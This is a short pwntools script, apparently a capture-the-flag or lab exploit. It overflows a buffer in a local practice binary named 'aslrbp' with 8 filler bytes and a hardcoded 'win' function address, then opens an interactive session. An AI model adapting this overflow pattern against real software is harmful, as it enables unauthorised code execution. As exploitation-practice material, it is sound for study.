from pwn import *

win = p64(0x1000004b0) 

p = process(["./aslrbp", "./1"])
p.sendline(b"A"*8 + win)
p.interactive()

